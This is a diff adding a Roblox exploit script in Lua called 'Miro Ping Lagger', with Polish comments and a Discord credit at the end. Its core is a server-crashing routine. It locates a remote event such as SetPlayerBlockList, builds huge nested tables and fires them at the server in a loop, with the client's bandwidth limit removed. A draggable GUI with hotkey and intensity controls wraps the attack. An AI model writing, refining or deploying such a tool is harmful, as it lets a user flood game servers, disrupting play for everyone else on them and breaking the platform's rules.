@@ -1,0 +1,605 @@
+local Players           = game:GetService("Players")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local NetworkClient     = game:GetService("NetworkClient")
+local TweenService      = game:GetService("TweenService")
+local CoreGui           = game:GetService("CoreGui")
+
+local lp = Players.LocalPlayer
+
+-- ==================== LAGGER CONFIG ====================
+local cfg = { lag1 = 200, lag2 = 1000, tries = 2, waitTime = 0.045 }
+
+local laggerEnabled = false
+local laggerThread  = nil
+local cachedRemote  = nil
+
+-- ==================== REMOTE FINDER ====================
+local function getDirectRemote()
+    local ok, result = pcall(function()
+        return game.RobloxReplicatedStorage:FindFirstChild("SetPlayerBlockList")
+    end)
+    if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
+        return result
+    end
+    return nil
+end
+
+local function findRemote()
+    if cachedRemote and cachedRemote.Parent then return cachedRemote end
+    local paths = {
+        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
+        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
+        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
+    }
+    for _, pathFn in ipairs(paths) do
+        local ok, result = pcall(pathFn)
+        if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
+            cachedRemote = result; return result
+        end
+    end
+    local services = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
+    for _, service in ipairs(services) do
+        if service then
+            for _, obj in ipairs(service:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
+                    local n = obj.Name:lower()
+                    if n:find("block") or n:find("steal") or n:find("accept")
+                    or n:find("report") or n:find("player") or n:find("lag") then
+                        cachedRemote = obj; return obj
+                    end
+                end
+            end
+        end
+    end
+    for _, service in ipairs(services) do
+        if service then
+            for _, obj in ipairs(service:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
+                    cachedRemote = obj; return obj
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function getRemote() return getDirectRemote() or findRemote() end
+
+local function bomb(tableincrease, maxCap, tries)
+    local maintable    = {}
+    local spammedtable = {{}}
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local t = {}; table.insert(z, t); z = t
+    end
+    local maximum = math.min(499999 / (tableincrease + 2), maxCap * 15)
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 15000 == 0 then task.wait() end
+    end
+    local remote = getRemote()
+    if remote then
+        for i = 1, tries do
+            local ok = pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+            if not ok then cachedRemote = nil end
+        end
+    end
+end
+
+local function crashLoop()
+    while laggerEnabled do
+        pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+        pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+        bomb(cfg.lag1, cfg.lag2, cfg.tries)
+        pcall(function()
+            for i = 1, 30 do
+                game:GetService("Stats"):Get("Network.ServerStatsItem")
+            end
+        end)
+        task.wait(cfg.waitTime)
+    end
+end
+
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread  = coroutine.create(crashLoop)
+    coroutine.resume(laggerThread)
+end
+
+local function stopLagger()
+    laggerEnabled = false
+    if laggerThread then
+        pcall(function() coroutine.close(laggerThread) end)
+        laggerThread = nil
+    end
+end
+
+local function toggleLagger()
+    if laggerEnabled then stopLagger() else startLagger() end
+end
+
+-- ==================== GUI ====================
+pcall(function()
+    if CoreGui:FindFirstChild("Miro_PingLagger") then CoreGui.Miro_PingLagger:Destroy() end
+end)
+pcall(function()
+    if lp.PlayerGui:FindFirstChild("Miro_PingLagger") then lp.PlayerGui.Miro_PingLagger:Destroy() end
+end)
+
+local SG = Instance.new("ScreenGui")
+SG.Name = "Miro_PingLagger"
+SG.ResetOnSpawn = false
+SG.IgnoreGuiInset = true
+SG.DisplayOrder = 1500
+if not pcall(function() SG.Parent = CoreGui end) then
+    SG.Parent = lp:WaitForChild("PlayerGui")
+end
+
+-- KOLORY
+local C = {
+    BG       = Color3.fromRGB(16, 11, 24),
+    Header   = Color3.fromRGB(18, 12, 28),
+    Purple   = Color3.fromRGB(135, 70, 215),
+    PurpleD  = Color3.fromRGB(95, 45, 165),
+    White    = Color3.new(1,1,1),
+    Dim      = Color3.fromRGB(165, 150, 185),
+    Dimmer   = Color3.fromRGB(115, 100, 135),
+    Brd      = Color3.fromRGB(55, 35, 80),
+}
+
+-- ============================================================
+-- WYMIARY (jak na obrazku 2 — kompaktowe, pionowe)
+-- ============================================================
+local W = 240; local H = 270
+
+local Main = Instance.new("Frame", SG)
+Main.Size             = UDim2.new(0, W, 0, H)
+Main.Position         = UDim2.new(0, 40, 0, 100)
+Main.BackgroundColor3 = C.BG
+Main.BackgroundTransparency = 1
+Main.BorderSizePixel  = 0
+Main.Active           = true
+Main.ClipsDescendants = true
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)
+local MStr = Instance.new("UIStroke", Main)
+MStr.Color = C.Brd; MStr.Thickness = 1
+MStr.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- ============================================================
+-- OBRAZEK TLA — DOKLADNIE jak w Vampire (ta sama metoda)
+-- ============================================================
+-- Warstwa koloru tla POD obrazkiem (bo Main jest przezroczyste)
+local BgColor = Instance.new("Frame", Main)
+BgColor.Size = UDim2.new(1, 0, 1, 0)
+BgColor.BackgroundColor3 = C.BG
+BgColor.BorderSizePixel = 0
+BgColor.ZIndex = 0
+Instance.new("UICorner", BgColor).CornerRadius = UDim.new(0, 8)
+
+local BgImg = Instance.new("ImageLabel", Main)
+BgImg.Size = UDim2.new(1, 0, 1, 0)
+BgImg.BackgroundTransparency = 1
+BgImg.Image = ""
+BgImg.ScaleType = Enum.ScaleType.Crop
+BgImg.ImageTransparency = 0
+BgImg.ZIndex = 0
+Instance.new("UICorner", BgImg).CornerRadius = UDim.new(0, 8)
+
+-- Ciemny overlay (zeby tekst czytelny ale obrazek widoczny)
+local Overlay = Instance.new("Frame", Main)
+Overlay.Size = UDim2.new(1, 0, 1, 0)
+Overlay.BackgroundColor3 = Color3.fromRGB(12, 6, 22)
+Overlay.BackgroundTransparency = 0.42
+Overlay.BorderSizePixel = 0
+Overlay.ZIndex = 1
+Instance.new("UICorner", Overlay).CornerRadius = UDim.new(0, 8)
+
+-- Pobierz obrazek z catbox (jak w Vampire) + fallback bezposredniego URL
+task.spawn(function()
+    local imgUrl = "https://files.catbox.moe/ulh80u.png"
+    local loaded = false
+
+    -- METODA 1: writefile + getcustomasset (jak w Vampire)
+    pcall(function()
+        local req = request or http_request or (syn and syn.request)
+        if req and getcustomasset and writefile then
+            local ok, resp = pcall(req, { Url = imgUrl, Method = "GET" })
+            if ok and resp and resp.Body and #resp.Body > 100 then
+                writefile("miro_bg.png", resp.Body)
+                BgImg.Image = getcustomasset("miro_bg.png")
+                loaded = true
+            end
+        elseif writefile and getcustomasset then
+            local ok2, data = pcall(function() return game:HttpGet(imgUrl) end)
+            if ok2 and data and #data > 100 then
+                writefile("miro_bg.png", data)
+                BgImg.Image = getcustomasset("miro_bg.png")
+                loaded = true
+            end
+        end
+    end)
+
+    -- sprawdz czy faktycznie sie zaladowal
+    task.wait(1)
+    if not loaded or not BgImg.IsLoaded then
+        -- METODA 2: bezposrednio URL w Image (niektore executery wspieraja)
+        pcall(function() BgImg.Image = imgUrl end)
+        task.wait(1.5)
+        if not BgImg.IsLoaded then
+            -- METODA 3: rbxthumb/asset via getcustomasset jeszcze raz po pelnej sciezce
+            pcall(function()
+                if getcustomasset and isfile and isfile("miro_bg.png") then
+                    BgImg.Image = getcustomasset("miro_bg.png")
+                end
+            end)
+        end
+    end
+end)
+
+-- drag
+do
+    local drag, ds, dp = false, nil, nil
+    Main.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1
+        or inp.UserInputType == Enum.UserInputType.Touch then
+            drag = true; ds = inp.Position; dp = Main.Position
+            inp.Changed:Connect(function()
+                if inp.UserInputState == Enum.UserInputState.End then drag = false end
+            end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if drag and (inp.UserInputType == Enum.UserInputType.MouseMovement
+        or inp.UserInputType == Enum.UserInputType.Touch) and ds then
+            local d = inp.Position - ds
+            Main.Position = UDim2.new(0, dp.X.Offset+d.X, 0, dp.Y.Offset+d.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1
+        or inp.UserInputType == Enum.UserInputType.Touch then drag = false end
+    end)
+end
+
+-- ============================================================
+-- NAGLOWEK (tytul wycentrowany jak na obrazku 2)
+-- ============================================================
+local Header = Instance.new("Frame", Main)
+Header.Size = UDim2.new(1, 0, 0, 38)
+Header.BackgroundColor3 = C.Header
+Header.BackgroundTransparency = 0.15
+Header.BorderSizePixel = 0
+Header.ZIndex = 2
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 8)
+local HFix = Instance.new("Frame", Header)
+HFix.Size = UDim2.new(1, 0, 0, 12); HFix.Position = UDim2.new(0, 0, 1, -12)
+HFix.BackgroundColor3 = C.Header; HFix.BackgroundTransparency = 0.15
+HFix.BorderSizePixel = 0; HFix.ZIndex = 2
+
+-- Lock icon (fioletowy, lewy gora)
+local LockBg = Instance.new("Frame", Header)
+LockBg.Size = UDim2.new(0, 16, 0, 16)
+LockBg.Position = UDim2.new(0, 8, 0, 7)
+LockBg.BackgroundColor3 = C.Purple
+LockBg.BorderSizePixel = 0
+LockBg.ZIndex = 3
+Instance.new("UICorner", LockBg).CornerRadius = UDim.new(0, 3)
+local LockIcon = Instance.new("TextLabel", LockBg)
+LockIcon.Size = UDim2.new(1, 0, 1, 0)
+LockIcon.BackgroundTransparency = 1
+LockIcon.Text = "🔒"
+LockIcon.TextColor3 = C.White
+LockIcon.Font = Enum.Font.GothamBlack
+LockIcon.TextSize = 10
+LockIcon.ZIndex = 4
+
+-- Tytul WYCENTROWANY
+local Title = Instance.new("TextLabel", Header)
+Title.Size = UDim2.new(1, -90, 0, 14)
+Title.Position = UDim2.new(0, 30, 0, 5)
+Title.BackgroundTransparency = 1
+Title.Text = "Miro Ping Lagger"
+Title.TextColor3 = C.White
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 12
+Title.TextXAlignment = Enum.TextXAlignment.Center
+Title.ZIndex = 3
+
+-- Subtitle wycentrowany pod tytulem
+local Sub = Instance.new("TextLabel", Header)
+Sub.Size = UDim2.new(1, -90, 0, 11)
+Sub.Position = UDim2.new(0, 30, 0, 19)
+Sub.BackgroundTransparency = 1
+Sub.Text = "ping lagger"
+Sub.TextColor3 = C.Dimmer
+Sub.Font = Enum.Font.Gotham
+Sub.TextSize = 8
+Sub.TextXAlignment = Enum.TextXAlignment.Center
+Sub.ZIndex = 3
+
+-- Minus / Plus (prawy gora)
+local MinBtn = Instance.new("TextButton", Header)
+MinBtn.Size = UDim2.new(0, 20, 0, 20)
+MinBtn.Position = UDim2.new(1, -46, 0, 9)
+MinBtn.BackgroundColor3 = Color3.fromRGB(14, 9, 22)
+MinBtn.BorderSizePixel = 0
+MinBtn.Text = "−"
+MinBtn.TextColor3 = C.Dim
+MinBtn.Font = Enum.Font.GothamBold
+MinBtn.TextSize = 12
+MinBtn.AutoButtonColor = false
+MinBtn.ZIndex = 3
+Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 3)
+
+local PlusBtn = Instance.new("TextButton", Header)
+PlusBtn.Size = UDim2.new(0, 20, 0, 20)
+PlusBtn.Position = UDim2.new(1, -24, 0, 9)
+PlusBtn.BackgroundColor3 = Color3.fromRGB(14, 9, 22)
+PlusBtn.BorderSizePixel = 0
+PlusBtn.Text = "+"
+PlusBtn.TextColor3 = C.Dim
+PlusBtn.Font = Enum.Font.GothamBold
+PlusBtn.TextSize = 12
+PlusBtn.AutoButtonColor = false
+PlusBtn.ZIndex = 3
+Instance.new("UICorner", PlusBtn).CornerRadius = UDim.new(0, 3)
+
+MinBtn.MouseButton1Click:Connect(function()
+    TweenService:Create(Main, TweenInfo.new(0.2), { Size = UDim2.new(0, W, 0, 38) }):Play()
+end)
+PlusBtn.MouseButton1Click:Connect(function()
+    TweenService:Create(Main, TweenInfo.new(0.2), { Size = UDim2.new(0, W, 0, H) }):Play()
+end)
+
+-- ============================================================
+-- BOCZNE ETYKIETY (faded, na obrazku — jak na obrazku 2)
+-- ============================================================
+local function mkSideLbl(yOff, txt)
+    local lbl = Instance.new("TextLabel", Main)
+    lbl.Size = UDim2.new(0, 54, 0, 10)
+    lbl.Position = UDim2.new(0, 5, 0, yOff)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = txt
+    lbl.TextColor3 = C.Dimmer
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 7
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.TextTransparency = 0.45
+    lbl.ZIndex = 2
+end
+
+mkSideLbl(48,  "PING LAGGER")
+mkSideLbl(94,  "LAG 1")
+mkSideLbl(132, "LAG 2")
+mkSideLbl(174, "EXIST")
+
+-- ============================================================
+-- CENTRALNY CONTENT
+-- ============================================================
+local Content = Instance.new("Frame", Main)
+Content.Size = UDim2.new(1, -12, 1, -44)
+Content.Position = UDim2.new(0, 6, 0, 40)
+Content.BackgroundTransparency = 1
+Content.ZIndex = 2
+
+-- "PING LAGGER" pill (czarny, wycentrowany u gory)
+local SecBox = Instance.new("Frame", Content)
+SecBox.Size = UDim2.new(0, 100, 0, 20)
+SecBox.AnchorPoint = Vector2.new(0.5, 0)
+SecBox.Position = UDim2.new(0.55, 0, 0, 4)
+SecBox.BackgroundColor3 = Color3.fromRGB(8, 5, 14)
+SecBox.BackgroundTransparency = 0.05
+SecBox.BorderSizePixel = 0
+SecBox.ZIndex = 3
+Instance.new("UICorner", SecBox).CornerRadius = UDim.new(0, 4)
+Instance.new("UIStroke", SecBox).Color = C.Brd
+
+local SecLbl = Instance.new("TextLabel", SecBox)
+SecLbl.Size = UDim2.new(1, 0, 1, 0)
+SecLbl.BackgroundTransparency = 1
+SecLbl.Text = "PING LAGGER"
+SecLbl.TextColor3 = C.White
+SecLbl.Font = Enum.Font.GothamBold
+SecLbl.TextSize = 9
+SecLbl.ZIndex = 4
+
+-- ============================================================
+-- WIERSZ LAG
+-- ============================================================
+local function mkLagRow(yOff, labelText, defaultVal, minV, maxV, onChange)
+    local row = Instance.new("Frame", Content)
+    row.Size = UDim2.new(1, -4, 0, 22)
+    row.Position = UDim2.new(0, 2, 0, yOff)
+    row.BackgroundColor3 = Color3.fromRGB(10, 6, 18)
+    row.BackgroundTransparency = 0.15
+    row.BorderSizePixel = 0
+    row.ZIndex = 3
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)
+    Instance.new("UIStroke", row).Color = C.Brd
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size = UDim2.new(0.4, 0, 1, 0)
+    lbl.Position = UDim2.new(0, 8, 0, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = labelText .. ":"
+    lbl.TextColor3 = C.White
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 10
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.ZIndex = 4
+
+    local minusBtn = Instance.new("TextButton", row)
+    minusBtn.Size = UDim2.new(0, 18, 0, 15)
+    minusBtn.AnchorPoint = Vector2.new(0, 0.5)
+    minusBtn.Position = UDim2.new(0.42, 0, 0.5, 0)
+    minusBtn.BackgroundColor3 = C.Purple
+    minusBtn.BorderSizePixel = 0
+    minusBtn.Text = "−"
+    minusBtn.TextColor3 = C.White
+    minusBtn.Font = Enum.Font.GothamBold
+    minusBtn.TextSize = 11
+    minusBtn.AutoButtonColor = false
+    minusBtn.ZIndex = 4
+    Instance.new("UICorner", minusBtn).CornerRadius = UDim.new(0, 3)
+
+    local valLbl = Instance.new("TextLabel", row)
+    valLbl.Size = UDim2.new(0, 40, 0, 15)
+    valLbl.AnchorPoint = Vector2.new(0, 0.5)
+    valLbl.Position = UDim2.new(0.42, 20, 0.5, 0)
+    valLbl.BackgroundColor3 = Color3.fromRGB(28, 18, 42)
+    valLbl.BorderSizePixel = 0
+    valLbl.Text = tostring(defaultVal)
+    valLbl.TextColor3 = C.White
+    valLbl.Font = Enum.Font.GothamBold
+    valLbl.TextSize = 10
+    valLbl.ZIndex = 4
+    Instance.new("UICorner", valLbl).CornerRadius = UDim.new(0, 3)
+
+    local plusBtn = Instance.new("TextButton", row)
+    plusBtn.Size = UDim2.new(0, 18, 0, 15)
+    plusBtn.AnchorPoint = Vector2.new(1, 0.5)
+    plusBtn.Position = UDim2.new(1, -6, 0.5, 0)
+    plusBtn.BackgroundColor3 = C.Purple
+    plusBtn.BorderSizePixel = 0
+    plusBtn.Text = "+"
+    plusBtn.TextColor3 = C.White
+    plusBtn.Font = Enum.Font.GothamBold
+    plusBtn.TextSize = 11
+    plusBtn.AutoButtonColor = false
+    plusBtn.ZIndex = 4
+    Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(0, 3)
+
+    local function step()
+        local v = tonumber(valLbl.Text) or 0
+        if v >= 500 then return 100
+        elseif v >= 100 then return 50
+        else return 10 end
+    end
+    local val = tonumber(defaultVal) or minV
+    local function update(newVal)
+        val = math.clamp(newVal, minV, maxV)
+        valLbl.Text = tostring(val)
+        if onChange then onChange(val) end
+    end
+    minusBtn.MouseButton1Click:Connect(function() update(val - step()) end)
+    plusBtn.MouseButton1Click:Connect(function() update(val + step()) end)
+end
+
+mkLagRow(36, "Lag 1", cfg.lag1, 10, 5000, function(v)
+    cfg.lag1 = v
+    if laggerEnabled then stopLagger(); task.wait(0.1); startLagger() end
+end)
+
+mkLagRow(74, "Lag 2", cfg.lag2, 10, 5000, function(v)
+    cfg.lag2 = v
+end)
+
+-- ============================================================
+-- LAGGER KEY
+-- ============================================================
+local KeyRow = Instance.new("Frame", Content)
+KeyRow.Size = UDim2.new(1, -4, 0, 22)
+KeyRow.Position = UDim2.new(0, 2, 0, 116)
+KeyRow.BackgroundColor3 = Color3.fromRGB(10, 6, 18)
+KeyRow.BackgroundTransparency = 0.15
+KeyRow.BorderSizePixel = 0
+KeyRow.ZIndex = 3
+Instance.new("UICorner", KeyRow).CornerRadius = UDim.new(0, 4)
+Instance.new("UIStroke", KeyRow).Color = C.Brd
+
+local KeyLbl = Instance.new("TextLabel", KeyRow)
+KeyLbl.Size = UDim2.new(0.55, 0, 1, 0)
+KeyLbl.Position = UDim2.new(0, 8, 0, 0)
+KeyLbl.BackgroundTransparency = 1
+KeyLbl.Text = "Lagger Key:"
+KeyLbl.TextColor3 = C.White
+KeyLbl.Font = Enum.Font.GothamBold
+KeyLbl.TextSize = 10
+KeyLbl.TextXAlignment = Enum.TextXAlignment.Left
+KeyLbl.ZIndex = 4
+
+local KeyBtn = Instance.new("TextButton", KeyRow)
+KeyBtn.Size = UDim2.new(0, 54, 0, 15)
+KeyBtn.AnchorPoint = Vector2.new(1, 0.5)
+KeyBtn.Position = UDim2.new(1, -6, 0.5, 0)
+KeyBtn.BackgroundColor3 = C.Purple
+KeyBtn.BorderSizePixel = 0
+KeyBtn.Text = "Three"
+KeyBtn.TextColor3 = C.White
+KeyBtn.Font = Enum.Font.GothamBold
+KeyBtn.TextSize = 9
+KeyBtn.AutoButtonColor = false
+KeyBtn.ZIndex = 4
+Instance.new("UICorner", KeyBtn).CornerRadius = UDim.new(0, 3)
+
+local currentKey = "Three"
+local listeningForKey = false
+
+KeyBtn.MouseButton1Click:Connect(function()
+    if listeningForKey then return end
+    listeningForKey = true
+    KeyBtn.Text = "..."
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if listeningForKey then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            local raw = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
+            currentKey = raw
+            local display = raw
+            if #display > 6 then display = display:sub(1, 6) end
+            KeyBtn.Text = display
+            listeningForKey = false
+        end
+        return
+    end
+    if gpe then return end
+    local ok, kc = pcall(function() return Enum.KeyCode[currentKey] end)
+    if ok and kc and input.KeyCode == kc then
+        toggleLagger()
+        if laggerEnabled then
+            KeyBtn.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
+        else
+            KeyBtn.BackgroundColor3 = C.Purple
+        end
+    end
+end)
+
+-- ============================================================
+-- "Miro mogs" WATERMARK (na dole nad obrazkiem)
+-- ============================================================
+local Watermark = Instance.new("TextLabel", Main)
+Watermark.Size = UDim2.new(1, 0, 0, 30)
+Watermark.AnchorPoint = Vector2.new(0.5, 1)
+Watermark.Position = UDim2.new(0.5, 0, 1, -14)
+Watermark.BackgroundTransparency = 1
+Watermark.Text = "Miro mogs"
+Watermark.TextColor3 = Color3.fromRGB(210, 185, 235)
+Watermark.Font = Enum.Font.GothamBlack
+Watermark.TextSize = 20
+Watermark.TextTransparency = 0.25
+Watermark.TextStrokeTransparency = 0.5
+Watermark.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+Watermark.ZIndex = 2
+
+-- Respawn support
+lp.CharacterAdded:Connect(function()
+    task.wait(1.2)
+    if laggerEnabled then
+        stopLagger()
+        task.wait(0.3)
+        startLagger()
+    end
+end)
+print("[Miro Ping Lagger] loaded")
+print("LEKAD BY FRNK33.")
+print("discord.gg/kastorhub")
